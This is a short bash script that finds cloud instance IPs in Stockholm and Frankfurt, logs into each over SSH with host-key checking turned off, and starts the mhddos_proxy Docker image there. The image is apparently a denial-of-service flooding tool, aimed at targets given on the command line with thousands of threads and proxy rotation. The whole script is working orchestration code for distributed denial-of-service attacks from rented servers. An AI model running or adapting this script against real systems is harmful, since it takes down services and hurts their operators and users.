#!/bin/bash

main(){
	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`
	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`

	echo -e "Fires on\n${@}\nby:"

	for ip in ${STOCKHOLM_INSTANCES_IPS}
	do
		fire "key-stockholm-0.pem" ${ip} ${@} &
	done

	for ip in ${FRANKFURT_INSTANCES_IPS}
	do
		fire "key-frankfurt-0.pem" ${ip} ${@} &
	done

	wait
}

fire(){
	local KEY=${1}
	local IP=${2}
	shift 2

	echo -e "    ${IP}"
	ssh \
		-o LogLevel=ERROR \
		-i ${KEY} \
		-o "StrictHostKeyChecking no" \
		"ubuntu@${IP}" \
			screen -dm \
				sudo docker run \
					-it \
					--rm \
					--pull always portholeascend/mhddos_proxy:latest ${@} \
					-t 5000 \
					-p 600 \
					--proxy-timeout 4 \
					--debug
}

./checkAWS.sh && main ${@} || ./awsCliNa.sh
